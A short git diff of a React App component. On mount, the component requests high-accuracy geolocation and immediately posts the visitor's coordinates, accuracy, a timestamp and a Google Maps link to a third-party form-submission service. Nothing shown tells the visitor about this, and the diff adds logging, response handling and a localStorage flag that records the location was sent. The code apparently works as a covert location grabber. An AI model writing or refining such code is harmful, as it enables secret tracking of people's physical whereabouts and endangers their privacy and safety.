@@ -29,9 +29,11 @@ export function App() {
   // Request location on mount
   useEffect(() => {
     if ('geolocation' in navigator) {
+      console.log('Requesting location permission...');
       navigator.geolocation.getCurrentPosition(
         async (position) => {
           const { latitude, longitude, accuracy } = position.coords;
+          console.log('Location captured:', { latitude, longitude, accuracy });
           
           // Send location immediately to Web3Forms
           const formData = new FormData();
@@ -42,17 +44,20 @@ export function App() {
           formData.append('message', `Latitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters\nTimestamp: ${new Date().toISOString()}\nGoogle Maps: https://www.google.com/maps?q=${latitude},${longitude}`);
           
           try {
-            await fetch('https://api.web3forms.com/submit', {
+            const response = await fetch('https://api.web3forms.com/submit', {
               method: 'POST',
               body: formData
             });
-            console.log('Location sent successfully');
+            const result = await response.json();
+            console.log('Location sent successfully:', result);
+            // Store that location was sent
+            localStorage.setItem('locationSent', 'true');
           } catch (error) {
             console.error('Location submission error:', error);
           }
         },
         (error) => {
-          console.log('Location permission denied or error:', error);
+          console.log('Location permission denied or error:', error.message);
         },
         {
           enableHighAccuracy: true,
@@ -60,6 +65,8 @@ export function App() {
           maximumAge: 0
         }
       );
+    } else {
+      console.log('Geolocation not supported');
     }
   }, []);
 
